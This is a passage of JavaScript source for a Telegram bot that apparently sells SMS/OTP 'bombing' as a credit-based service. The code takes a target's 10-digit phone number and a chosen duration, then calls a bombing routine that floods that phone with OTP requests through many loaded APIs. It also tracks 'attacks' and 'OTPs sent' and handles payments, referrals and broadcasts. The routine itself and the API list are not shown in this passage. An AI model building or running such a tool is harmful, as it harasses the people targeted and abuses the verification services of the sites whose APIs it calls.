                { text: '❌ Reject', callback_data: `reject_pay_${payId}` }
            ]
        ]
    };

    for (const adminId of ADMIN_IDS) {
        try {
            await bot.sendPhoto(adminId, photo.file_id, {
                caption: adminMsg,
                parse_mode: 'Markdown',
                reply_markup: approvalKeyboard
            });
        } catch (e) {
            console.error(`Failed to send to admin ${adminId}:`, e.message);
        }
    }

    await bot.sendMessage(chatId, `✅ **Payment screenshot received!**\n\n⏳ Waiting for admin approval...\n📱 Plan: ${plan.label}\n💳 Amount: ₹${plan.price}\n\nYou will receive credits once approved.`);

    userStates.delete(chatId);
}

// ============================================================
// ===== QR CODE SET HANDLER =====
// ============================================================

async function handleSetQRCode(chatId, msg) {
    if (!ADMIN_IDS.includes(Number(chatId))) {
        return bot.sendMessage(chatId, '❌ Admin only!');
    }

    if (!msg.photo) {
        return bot.sendMessage(chatId, '📸 **Please send a photo to set as QR code.**\n\nSend any image that will be shown to users when they buy credits.', { parse_mode: 'Markdown' });
    }

    try {
        const photo = msg.photo[msg.photo.length - 1];
        const file = await bot.getFile(photo.file_id);
        const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        
        const response = await axios({ url, responseType: 'stream', timeout: 30000 });
        const writer = fs.createWriteStream(qrCodePath);
        response.data.pipe(writer);
        
        writer.on('finish', () => {
            qrCodeSet = true;
            bot.sendMessage(chatId, '✅ **QR Code saved successfully!**\n\nUsers will now see this QR code when buying credits.', { parse_mode: 'Markdown' });
        });
        
        writer.on('error', (err) => {
            bot.sendMessage(chatId, `❌ Failed to save QR code: ${err.message}`);
        });
        
        userStates.delete(chatId);
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
}

// ============================================================
// ===== BROADCAST SYSTEM =====
// ============================================================

async function handleBroadcast(chatId, msg) {
    try {
        const users = await db.User.find().select('_id');
        const totalUsers = users.length;
        
        if (totalUsers === 0) {
            return bot.sendMessage(chatId, '❌ No users found in database!');
        }
        
        const processingMsg = await bot.sendMessage(chatId, `📢 **Broadcasting to ${totalUsers} users...**\n\n⏳ Please wait...`, { parse_mode: 'Markdown' });
        
        let messageType = 'text';
        let mediaId = null;
        let caption = msg.caption || '';
        let text = msg.text || '';
        
        if (msg.photo) { messageType = 'photo'; mediaId = msg.photo[msg.photo.length - 1].file_id; caption = msg.caption || ''; }
        else if (msg.video) { messageType = 'video'; mediaId = msg.video.file_id; caption = msg.caption || ''; }
        else if (msg.document) { messageType = 'document'; mediaId = msg.document.file_id; caption = msg.caption || ''; }
        else if (msg.audio) { messageType = 'audio'; mediaId = msg.audio.file_id; caption = msg.caption || ''; }
        else if (msg.voice) { messageType = 'voice'; mediaId = msg.voice.file_id; caption = msg.caption || ''; }
        else if (msg.sticker) { messageType = 'sticker'; mediaId = msg.sticker.file_id; }
        else if (msg.animation) { messageType = 'animation'; mediaId = msg.animation.file_id; caption = msg.caption || ''; }
        else if (msg.video_note) { messageType = 'video_note'; mediaId = msg.video_note.file_id; }
        else if (msg.text) { messageType = 'text'; text = msg.text; }
        
        let success = 0, fail = 0, blocked = 0, invalid = 0;
        const startTime = Date.now();
        const BATCH_SIZE_BROADCAST = 10;
        
        for (let i = 0; i < users.length; i++) {
            const user = users[i];
            const targetId = user._id;
            
            try {
                switch (messageType) {
                    case 'text':
                        await bot.sendMessage(targetId, `📢 **BROADCAST**\n\n${text}`, { parse_mode: 'Markdown', disable_web_page_preview: true });
                        break;
                    case 'photo':
                        await bot.sendPhoto(targetId, mediaId, { caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**', parse_mode: 'Markdown' });
                        break;
                    case 'video':
                        await bot.sendVideo(targetId, mediaId, { caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**', parse_mode: 'Markdown' });
                        break;
                    case 'document':
                        await bot.sendDocument(targetId, mediaId, { caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**', parse_mode: 'Markdown' });
                        break;
                    case 'audio':
                        await bot.sendAudio(targetId, mediaId, { caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**', parse_mode: 'Markdown' });
                        break;
                    case 'voice':
                        await bot.sendVoice(targetId, mediaId, { caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**', parse_mode: 'Markdown' });
                        break;
                    case 'sticker':
                        await bot.sendSticker(targetId, mediaId);
                        break;
                    case 'animation':
                        await bot.sendAnimation(targetId, mediaId, { caption: caption ? `📢 **BROADCAST**\n\n${caption}` : '📢 **BROADCAST**', parse_mode: 'Markdown' });
                        break;
                    case 'video_note':
                        await bot.sendVideoNote(targetId, mediaId);
                        break;
                    default:
                        await bot.sendMessage(targetId, `📢 **BROADCAST**\n\nPlease check the channel for updates.`, { parse_mode: 'Markdown' });
                }
                success++;
            } catch (error) {
                const errorMsg = error.message || '';
                if (errorMsg.includes('blocked')) blocked++;
                else if (errorMsg.includes('chat not found') || errorMsg.includes('user not found') || errorMsg.includes('USER_ID_INVALID')) invalid++;
                else fail++;
            }
            
            if ((i + 1) % BATCH_SIZE_BROADCAST === 0 || i === users.length - 1) {
                const processed = i + 1;
                const progress = Math.round((processed / totalUsers) * 100);
                try {
                    await bot.editMessageText(
                        `📢 **BROADCASTING...**\n\n📊 Total Users: ${totalUsers}\n✅ Success: ${success}\n❌ Failed: ${fail}\n🚫 Blocked: ${blocked}\n❓ Invalid: ${invalid}\n⏳ Progress: ${progress}%\n📎 Type: ${messageType.toUpperCase()}`,
                        { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'Markdown' }
                    );
                } catch (e) {}
            }
            
            await new Promise(r => setTimeout(r, 20));
        }
        
        const totalTime = Math.floor((Date.now() - startTime) / 1000);
        const totalReachable = totalUsers - blocked - invalid;
        const successRate = totalReachable > 0 ? Math.round((success / totalReachable) * 100) : 0;
        
        await bot.editMessageText(
            `✅ **BROADCAST COMPLETED!**\n\n📊 Total Users: ${totalUsers}\n✅ Success: ${success}\n❌ Failed: ${fail}\n🚫 Blocked: ${blocked}\n❓ Invalid IDs: ${invalid}\n📈 Success Rate: ${successRate}%\n⏱️ Time Taken: ${totalTime}s\n📎 Message Type: ${messageType.toUpperCase()}\n\n🔄 Use /broadcast to send another broadcast`,
            { chat_id: chatId, message_id: processingMsg.message_id, parse_mode: 'Markdown' }
        );
        
    } catch (error) {
        console.error('Broadcast error:', error);
        bot.sendMessage(chatId, `❌ Broadcast failed: ${error.message}`);
    } finally {
        adminBroadcastState.delete(chatId);
    }
}

// ============================================================
// ===== COMMAND HANDLERS =====
// ============================================================

bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const args = msg.text.split(' ');
    const refCode = args.length > 1 ? args[1] : null;

    if (await db.isBanned(chatId)) {
        bot.sendMessage(chatId, '🚫 You are banned!');
        return;
    }

    const user = await db.getUser(chatId);
    user.username = msg.from.username || '';
    user.first_name = msg.from.first_name || '';
    await user.save();

    if (refCode) {
        user.pending_ref_code = refCode;
        await user.save();
    }

    const joined = await db.isJoined(chatId, bot);
    if (!joined) {
        const channels = await db.getChannels();
        if (channels.length > 0) {
            const keyboard = await getChannelButtons();
            bot.sendMessage(chatId, `🚫 **Please join our channel(s) first!**\n\nRequired channels:\n${channels.join('\n')}\n\nAfter joining all channels, click the green button below.`, { parse_mode: 'Markdown', reply_markup: keyboard });
        } else {
            await showMainMenu(chatId);
        }
        return;
    }

    await showMainMenu(chatId);
});

async function showMainMenu(chatId) {
    const user = await db.getUser(chatId);
    if (user.pending_ref_code) {
        const result = await db.processReferral(chatId, user.pending_ref_code);
        bot.sendMessage(chatId, result.success ? `🎉 ${result.msg}` : `❌ ${result.msg}`);
        user.pending_ref_code = null;
        await user.save();
    }
    const code = await db.generateReferralCode(chatId);
    const botInfo = await bot.getMe();
    const welcome = `👋 Welcome!\n\n🔗 Your Referral Code: \`${code}\`\n📤 Share: \`https://t.me/${botInfo.username}?start=${code}\`\n\nUse the buttons below!`;
    bot.sendMessage(chatId, welcome, { parse_mode: 'Markdown', ...mainKeyboard() });
}

// ============================================================
// ===== MESSAGE HANDLER =====
// ============================================================

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    if (await db.isBanned(chatId)) return bot.sendMessage(chatId, '🚫 You are banned!');

    const user = await db.getUser(chatId);

    // Smart Broadcast
    if (adminBroadcastState.has(chatId) && ADMIN_IDS.includes(Number(chatId))) {
        const state = adminBroadcastState.get(chatId);
        if (state && state.active) {
            if (text === '/cancel' || text === 'Cancel' || text === '❌ Cancel') {
                adminBroadcastState.delete(chatId);
                return bot.sendMessage(chatId, '❌ Broadcast cancelled.');
            }
            await handleBroadcast(chatId, msg);
            return;
        }
    }

    // Payment Screenshot
    const state = userStates.get(chatId);
    if (state && state.state === 'payment_screenshot' && msg.photo) {
        await handlePaymentScreenshot(chatId, msg);
        return;
    }

    // Set QR Code
    if (text === '📸 SET QR CODE') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.sendMessage(chatId, '❌ Admin only!');
        bot.sendMessage(chatId, '📸 **Send QR Code Photo**\n\nSend a photo to set as payment QR code.', { parse_mode: 'Markdown' });
        userStates.set(chatId, { state: 'set_qr' });
        return;
    }

    if (state && state.state === 'set_qr' && msg.photo) {
        await handleSetQRCode(chatId, msg);
        return;
    }

    // Payment Approval
    if (text === '💳 PAYMENT APPROVAL') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.sendMessage(chatId, '❌ Admin only!');
        const pending = Array.from(pendingScreenshots.values()).filter(p => p.status === 'pending');
        if (pending.length === 0) return bot.sendMessage(chatId, '📭 No pending payments.');
        let msgText = `💳 **Pending Payments** (${pending.length})\n\n`;
        for (const p of pending) {
            msgText += `👤 ${p.first_name} (@${p.username})\n💳 ${p.plan} - ₹${p.price}\n🆔 \`${p.payId}\`\n\n`;
        }
        bot.sendMessage(chatId, msgText, { parse_mode: 'Markdown' });
        return;
    }

    // Buy Credits
    if (text === '💳 BUY CREDITS') {
        const keyboard = {
            inline_keyboard: [
                [{ text: '10 Credits – ₹20', callback_data: 'buy_10' }],
                [{ text: '25 Credits – ₹40', callback_data: 'buy_25' }],
                [{ text: '50 Credits – ₹70', callback_data: 'buy_50' }],
                [{ text: '100 Credits – ₹120', callback_data: 'buy_100' }],
                [{ text: '⭐ 1 Day Unlimited – ₹150', callback_data: 'buy_unlimited' }],
            ]
        };
        bot.sendMessage(chatId, '💳 **Choose a plan:**', { parse_mode: 'Markdown', reply_markup: keyboard });
        return;
    }

    // My Credits
    if (text === '💰 MY CREDITS') {
        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
        const unlimitedText = isUnlimited ? '\n⭐ **Unlimited Plan Active!**' : '';
        bot.sendMessage(chatId, `💰 **Your Credits:** \`${user.credits}\`${unlimitedText}\n⚔️ **Total Attacks:** ${user.total_attacks || 0}`, { parse_mode: 'Markdown' });
        return;
    }

    // Daily Spin
    if (text === '🎁 DAILY SPIN') {
        const now = Date.now() / 1000;
        if (user.last_daily && user.last_daily > now - 86400) {
            const remaining = Math.ceil((user.last_daily + 86400 - now) / 60);
            return bot.sendMessage(chatId, `⏳ You already claimed today's spin! Try again in ${remaining} minutes.`);
        }
        const spins = ['🎲  ...', '⚙️  ...', '🎡  ...'];
        let spinMsg = await bot.sendMessage(chatId, '🎰  ...');
        for (const spin of spins) {
            await bot.editMessageText(spin, { chat_id: chatId, message_id: spinMsg.message_id });
            await new Promise(r => setTimeout(r, 300));
        }
        const reward = Math.floor(Math.random() * 10) + 1;
        await db.updateCredits(chatId, reward);
        user.last_daily = now;
        await user.save();
        const newBalance = (await db.getUser(chatId)).credits;
        await bot.editMessageText(`🎉 **You won ${reward} credits!**\n💰 New balance: ${newBalance}`, { chat_id: chatId, message_id: spinMsg.message_id, parse_mode: 'Markdown' });
        return;
    }

    // Redeem Code
    if (text === '🎟️ REDEEM CODE') {
        userStates.set(chatId, { state: 'redeem_code' });
        bot.sendMessage(chatId, '🎟️ Send the redeem code:');
        return;
    }

    // Referral
    if (text === '🔗 REFERRAL') {
        if (!await db.isJoined(chatId, bot)) {
            const channels = await db.getChannels();
            return bot.sendMessage(chatId, `🚫 Join required channels first:\n${channels.join('\n')}`);
        }
        const code = await db.generateReferralCode(chatId);
        const botInfo = await bot.getMe();
        const refData = await db.getReferralData(chatId);
        const count = refData.count || 0;
        bot.sendMessage(chatId, `🔗 **Your Referral Code**\n\n🎯 \`${code}\`\n\n📊 Referred: ${count} users\n💰 Earned: ${count * 5} credits\n\n📤 Link: \`https://t.me/${botInfo.username}?start=${code}\``, { parse_mode: 'Markdown' });
        return;
    }

    // My Stats
    if (text === '📊 MY STATS') {
        const sessions = user.bomb_sessions || [];
        const totalSessions = sessions.length;
        const totalSent = sessions.reduce((sum, s) => sum + (s.total_sent || 0), 0);
        const isUnlimited = user.daily_unlimited > Date.now() / 1000;
        bot.sendMessage(chatId, `📊 **Your Stats**\n👤 ID: ${chatId}\n💰 Credits: ${user.credits}\n⚔️ Attacks: ${user.total_attacks || 0}\n📈 Sessions: ${totalSessions}\n📬 OTPs Sent: ${totalSent}\n⭐ Unlimited: ${isUnlimited ? '✅ Active' : '❌ Inactive'}`, { parse_mode: 'Markdown' });
        return;
    }

    // Help
    if (text === '❓ HELP') {
        bot.sendMessage(chatId, `🤖 **BOT COMMANDS**\n\n📱 **/bomb** - Start bombing\n⏹️ **/stop** - Stop bombing\n💰 **/credits** - Check credits\n🎁 **/daily** - Daily spin\n🎟️ **/redeem** - Redeem code\n🔗 **/referral** - Referral link\n💳 **/buy** - Buy credits\n\n🚀 ${allApis.length} APIs loaded!`, { parse_mode: 'Markdown' });
        return;
    }

    // Settings
    if (text === '⚙️ SETTINGS') {
        const keyboard = {
            inline_keyboard: [
                [{ text: '📋 View Settings', callback_data: 'settings_view' }],
                [{ text: '🔍 Add Scanner', callback_data: 'settings_add_scanner' }],
                [{ text: '📝 Modify Headers', callback_data: 'settings_modify_headers' }]
            ]
        };
        bot.sendMessage(chatId, '⚙️ **Settings Panel**', { parse_mode: 'Markdown', reply_markup: keyboard });
        return;
    }

    // Admin Panel
    if (text === '👑 ADMIN PANEL') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.sendMessage(chatId, '❌ You are not an admin.');
        bot.sendMessage(chatId, '🔐 Admin Panel', adminKeyboard());
        return;
    }

    if (text === '🔙 BACK') {
        bot.sendMessage(chatId, '🔙 Back to main menu', mainKeyboard());
        return;
    }

    // Admin Commands
    if (ADMIN_IDS.includes(Number(chatId))) {
        if (text === '📊 STATS') {
            const totalUsers = await db.User.countDocuments();
            const totalAttacks = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$total_attacks' } } }]))[0]?.total || 0;
            const totalCredits = (await db.User.aggregate([{ $group: { _id: null, total: { $sum: '$credits' } } }]))[0]?.total || 0;
            const config = await db.getScannerConfig();
            const channels = await db.getChannels();
            bot.sendMessage(chatId, `📊 **BOT STATS**\n👥 Users: ${totalUsers}\n💰 Credits: ${totalCredits}\n⚔️ Attacks: ${totalAttacks}\n📡 APIs: ${allApis.length}\n📺 Channels: ${channels.length}\n🛡️ Scanners: ${config.scanners.length}`, { parse_mode: 'Markdown' });
            return;
        }

        if (text === '👥 USERS LIST') {
            const users = await db.User.find().select('_id username credits total_attacks').limit(20);
            let list = '👥 Users (first 20):\n\n';
            users.forEach(u => list += `🆔 ${u._id} | @${u.username || 'no'} | 💰${u.credits} | 💥${u.total_attacks}\n`);
            bot.sendMessage(chatId, list);
            return;
        }

        if (text === '🎟️ GEN CODE') {
            userStates.set(chatId, { state: 'gen_code' });
            bot.sendMessage(chatId, '💰 Send amount for redeem code (max 1000):');
            return;
        }

        if (text === '🚫 BAN USER') { userStates.set(chatId, { state: 'ban_user' }); bot.sendMessage(chatId, '🚫 Send user ID to ban:'); return; }
        if (text === '✅ UNBAN USER') { userStates.set(chatId, { state: 'unban_user' }); bot.sendMessage(chatId, '✅ Send user ID to unban:'); return; }
        if (text === '💰 ADD CREDITS') { userStates.set(chatId, { state: 'add_credits' }); bot.sendMessage(chatId, '💰 Send user ID:'); return; }
        if (text === '➕ ADD PROTECTED') { userStates.set(chatId, { state: 'add_protected' }); bot.sendMessage(chatId, '🛡️ Send 10-digit number to protect:'); return; }
        if (text === '➖ REMOVE PROTECTED') { userStates.set(chatId, { state: 'remove_protected' }); bot.sendMessage(chatId, '❌ Send 10-digit number to unprotect:'); return; }

        if (text === '📋 PROTECTED LIST') {
            const list = await db.getProtected();
            bot.sendMessage(chatId, `🛡️ **Protected Numbers**\n${list.length ? list.join('\n') : 'None'}`);
            return;
        }

        if (text === '📢 BROADCAST') {
            const keyboard = {
                inline_keyboard: [
                    [{ text: '📤 Start Broadcast', callback_data: 'smart_broadcast_start' }],
                    [{ text: '❌ Cancel', callback_data: 'smart_broadcast_cancel' }]
                ]
            };
            bot.sendMessage(chatId, '📢 **Broadcast System**\n\nSend any message (text, photo, video, GIF, etc.) to all users.', { parse_mode: 'Markdown', reply_markup: keyboard });
            return;
        }

        if (text === '📋 ALL USERS') {
            const users = await db.User.find().select('_id username credits');
            let page = 0;
            const perPage = 15;
            const totalPages = Math.ceil(users.length / perPage);
            const sendPage = async (pageNum) => {
                const start = pageNum * perPage;
                const end = start + perPage;
                const chunk = users.slice(start, end);
                let msg = '👥 **ALL USERS**\n\n';
                chunk.forEach(u => msg += `🆔 \`${u._id}\` | @${u.username || 'no'} | 💰${u.credits}\n`);
                msg += `\nPage ${pageNum+1}/${totalPages}`;
                const markup = totalPages > 1 ? {
                    inline_keyboard: [
                        ...(pageNum > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${pageNum-1}` }] : []),
                        ...(pageNum < totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${pageNum+1}` }] : [])
                    ]
                } : undefined;
                return bot.sendMessage(chatId, msg, { parse_mode: 'Markdown', reply_markup: markup });
            };
            await sendPage(0);
            userStates.set(chatId, { state: 'allusers', users, page: 0, perPage, totalPages });
            return;
        }

        if (text === '🔄 UNLIMITED PLAN') {
            userStates.set(chatId, { state: 'unlimited_plan' });
            bot.sendMessage(chatId, '⭐ Send user ID to grant 1-day unlimited plan:');
            return;
        }

        if (text === '📺 CHANNEL MANAGER') {
            const keyboard = {
                inline_keyboard: [
                    [{ text: '➕ Add Channel', callback_data: 'channel_add' }],
                    [{ text: '➖ Remove Channel', callback_data: 'channel_remove' }],
                    [{ text: '📋 View Channels', callback_data: 'channel_view' }],
                    [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
                ]
            };
            bot.sendMessage(chatId, '📺 **Channel Manager**', { reply_markup: keyboard });
            return;
        }

        if (text === '🛡️ SCANNER MANAGER') {
            const keyboard = {
                inline_keyboard: [
                    [{ text: '➕ Add Scanner', callback_data: 'scanner_add' }],
                    [{ text: '➖ Remove Scanner', callback_data: 'scanner_remove' }],
                    [{ text: '📋 View Scanners', callback_data: 'scanner_view' }],
                    [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
                ]
            };
            bot.sendMessage(chatId, '🛡️ **Scanner Manager**', { reply_markup: keyboard });
            return;
        }
    }

    // Start Bomb
    if (text.includes('START BOMB')) {
        if (bombingStatus.get(chatId)) return bot.sendMessage(chatId, '❌ Active bombing. Use /stop first.');
        if (!await db.isJoined(chatId, bot)) {
            const channels = await db.getChannels();
            return bot.sendMessage(chatId, `🚫 Join required channels:\n${channels.join('\n')}`);
        }
        bot.sendMessage(chatId, '📱 Send the 10-digit phone number to bomb:');
        userStates.set(chatId, { state: 'enter_phone' });
        return;
    }

    // Stop Bomb
    if (text === '🔴 STOP BOMB') {
        if (bombingStatus.get(chatId)) {
            bombingStatus.set(chatId, false);
            bot.sendMessage(chatId, '⏹️ Bombing stopped.');
        } else {
            bot.sendMessage(chatId, '❌ No active bombing.');
        }
        return;
    }

    // State Handlers
    if (userStates.has(chatId)) {
        const state = userStates.get(chatId);
        const input = text.trim();

        if (state.state === 'redeem_code') {
            const amount = await db.getRedeemCode(input.toUpperCase());
            if (amount === null) bot.sendMessage(chatId, '❌ Invalid code!');
            else { await db.updateCredits(chatId, amount); bot.sendMessage(chatId, `✅ Redeemed ${amount} credits!`); }
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'enter_phone') {
            const phone = input.replace(/\D/g, '');
            if (phone.length !== 10) return bot.sendMessage(chatId, '❌ Invalid number! Must be 10 digits.');
            userStates.set(chatId, { phone: phone });
            const keyboard = {
                inline_keyboard: [
                    [{ text: '🟢 1 Min (1 coin)', callback_data: 'dur_1' }, { text: '🟢 2 Min (2 coins)', callback_data: 'dur_2' }, { text: '🟢 3 Min (3 coins)', callback_data: 'dur_3' }],
                    [{ text: '🟢 5 Min (5 coins)', callback_data: 'dur_5' }, { text: '🟢 10 Min (10 coins)', callback_data: 'dur_10' }, { text: '🟢 30 Min (10 coins)', callback_data: 'dur_30' }],
                    [{ text: '🟢 60 Min (10 coins)', callback_data: 'dur_60' }, { text: '⭐ 1 Day (100 coins)', callback_data: 'dur_1440' }]
                ]
            };
            bot.sendMessage(chatId, `📱 Target: \`${phone}\`\n⏱️ **Select Duration:**`, { parse_mode: 'Markdown', reply_markup: keyboard });
            return;
        }

        if (state.state === 'gen_code') {
            const amount = parseInt(input);
            if (isNaN(amount) || amount <= 0 || amount > 1000) return bot.sendMessage(chatId, '❌ Invalid amount.');
            const code = 'RTF' + Math.random().toString(36).substring(2, 7).toUpperCase();
            await db.createRedeemCode(code, amount);
            bot.sendMessage(chatId, `✅ Code: \`${code}\`\nAmount: ${amount} credits`, { parse_mode: 'Markdown' });
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'ban_user') {
            const id = parseInt(input);
            if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            await db.banUser(id);
            bot.sendMessage(chatId, `✅ Banned ${id}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'unban_user') {
            const id = parseInt(input);
            if (isNaN(id)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            await db.unbanUser(id);
            bot.sendMessage(chatId, `✅ Unbanned ${id}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'add_credits') {
            const uid = parseInt(input);
            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            userStates.set(chatId, { state: 'add_credits_amount', uid });
            bot.sendMessage(chatId, '💰 Send amount to add:');
            return;
        }
        if (state.state === 'add_credits_amount') {
            const amount = parseInt(input);
            if (isNaN(amount) || amount <= 0) return bot.sendMessage(chatId, '❌ Invalid amount.');
            await db.updateCredits(state.uid, amount);
            bot.sendMessage(chatId, `✅ Added ${amount} credits to ${state.uid}`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'add_protected') {
            if (!input.match(/^\d{10}$/)) return bot.sendMessage(chatId, '❌ Invalid number.');
            await db.addProtected(input);
            bot.sendMessage(chatId, `✅ ${input} added to protected list.`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'remove_protected') {
            if (!input.match(/^\d{10}$/)) return bot.sendMessage(chatId, '❌ Invalid number.');
            await db.removeProtected(input);
            bot.sendMessage(chatId, `✅ ${input} removed from protected list.`);
            userStates.delete(chatId);
            return;
        }

        if (state.state === 'unlimited_plan') {
            const uid = parseInt(input);
            if (isNaN(uid)) return bot.sendMessage(chatId, '❌ Invalid ID.');
            const target = await db.getUser(uid);
            target.daily_unlimited = Date.now() / 1000 + 86400;
            await target.save();
            bot.sendMessage(chatId, `✅ Unlimited plan granted to ${uid} for 24h!`);
            try { await bot.sendMessage(uid, '⭐ **1-Day Unlimited Plan Activated!**\nUse /bomb to start bombing.'); } catch (e) {}
            userStates.delete(chatId);
            return;
        }
    }
});

// ============================================================
// ===== CALLBACK QUERY HANDLER =====
// ============================================================

bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    const msgId = callbackQuery.message.message_id;

    if (data === 'verify_join') {
        const joined = await db.isJoined(chatId, bot);
        if (joined) {
            bot.editMessageText('✅ Joined! Access granted.', { chat_id: chatId, message_id: msgId });
            await showMainMenu(chatId);
        } else {
            bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not joined all channels.', show_alert: true });
        }
        return;
    }

    if (data.startsWith('dur_')) {
        const dur = parseInt(data.split('_')[1]);
        const state = userStates.get(chatId);
        if (state && state.phone) {
            const phone = state.phone;
            userStates.delete(chatId);
            await runBomber(chatId, phone, dur);
        } else {
            bot.sendMessage(chatId, '❌ Enter phone number first.');
        }
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data.startsWith('buy_')) {
        const planKey = data.replace('buy_', '');
        await handleBuyCredits(chatId, planKey);
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data.startsWith('approve_pay_')) {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        const payId = data.replace('approve_pay_', '');
        const payment = pendingScreenshots.get(payId);
        if (!payment) return bot.editMessageText('❌ Payment not found.', { chat_id: chatId, message_id: msgId });
        try {
            if (payment.credits > 0) await db.updateCredits(payment.userId, payment.credits);
            else { const u = await db.getUser(payment.userId); u.daily_unlimited = Date.now() / 1000 + 86400; await u.save(); }
            payment.status = 'approved';
            try { await bot.sendMessage(payment.userId, `🎉 **Payment Approved!**\n✅ ₹${payment.price} approved.\n${payment.credits > 0 ? `💰 +${payment.credits} credits!` : '⭐ Unlimited Plan Activated!'}`); } catch (e) {}
            await bot.editMessageText(`✅ **Approved!**\n👤 ${payment.first_name}\n💰 ₹${payment.price}`, { chat_id: chatId, message_id: msgId });
            pendingScreenshots.delete(payId);
        } catch (error) {
            bot.editMessageText(`❌ Error: ${error.message}`, { chat_id: chatId, message_id: msgId });
        }
        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved!' });
        return;
    }

    if (data.startsWith('reject_pay_')) {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        const payId = data.replace('reject_pay_', '');
        const payment = pendingScreenshots.get(payId);
        if (!payment) return bot.editMessageText('❌ Not found.', { chat_id: chatId, message_id: msgId });
        payment.status = 'rejected';
        try { await bot.sendMessage(payment.userId, `❌ **Payment Rejected**\nPlease try again.`); } catch (e) {}
        await bot.editMessageText(`❌ **Rejected**\n👤 ${payment.first_name}\n💰 ₹${payment.price}`, { chat_id: chatId, message_id: msgId });
        pendingScreenshots.delete(payId);
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Rejected' });
        return;
    }

    if (data === 'smart_broadcast_start') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only!', show_alert: true });
        adminBroadcastState.set(chatId, { mode: 'broadcast', active: true });
        bot.editMessageText('📢 **Broadcast Mode Activated**\n\nSend any message to broadcast to ALL users!\nSend /cancel to exit.', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Send your message now!' });
        return;
    }

    if (data === 'smart_broadcast_cancel') {
        adminBroadcastState.delete(chatId);
        bot.editMessageText('❌ Broadcast cancelled.', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Cancelled' });
        return;
    }

    if (data === 'channel_add') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        userStates.set(chatId, { state: 'add_channel' });
        bot.editMessageText('📺 Send channel username (e.g., @channelname):', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'channel_remove') {
        if (!ADMIN_IDS.includes(Number(chatId))) return bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Admin only' });
        const channels = await db.getChannels();
        if (channels.length === 0) { bot.editMessageText('📭 No channels.', { chat_id: chatId, message_id: msgId }); return bot.answerCallbackQuery(callbackQuery.id); }
        userStates.set(chatId, { state: 'remove_channel' });
        bot.editMessageText('📺 **Current Channels:**\n' + channels.join('\n') + '\n\nSend channel to remove:', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'channel_view') {
        const channels = await db.getChannels();
        bot.editMessageText(channels.length ? `📺 **Channels:**\n${channels.join('\n')}` : '📭 No channels.', { chat_id: chatId, message_id: msgId });
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data === 'admin_back') {
        bot.editMessageText('🔐 Admin Panel', { chat_id: chatId, message_id: msgId });
        bot.sendMessage(chatId, '🔐 Admin Panel', adminKeyboard());
        bot.answerCallbackQuery(callbackQuery.id);
        return;
    }

    if (data.startsWith('allusers_')) {
        const page = parseInt(data.split('_')[1]);
        const state = userStates.get(chatId);
        if (state && state.state === 'allusers') {
            const start = page * state.perPage;
            const end = start + state.perPage;
            const chunk = state.users.slice(start, end);
            let msg = '👥 **ALL USERS**\n\n';
            chunk.forEach(u => msg += `🆔 \`${u._id}\` | @${u.username || 'no'} | 💰${u.credits}\n`);
            msg += `\nPage ${page+1}/${state.totalPages}`;
            const markup = {
                inline_keyboard: [
                    ...(page > 0 ? [{ text: '◀️ Prev', callback_data: `allusers_${page-1}` }] : []),
                    ...(page < state.totalPages-1 ? [{ text: 'Next ▶️', callback_data: `allusers_${page+1}` }] : [])
                ]
            };
            bot.editMessageText(msg, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown', reply_markup: markup });
            state.page = page;
            userStates.set(chatId, state);
        }
        bot.answerCallbackQuery(callbackQuery.id);
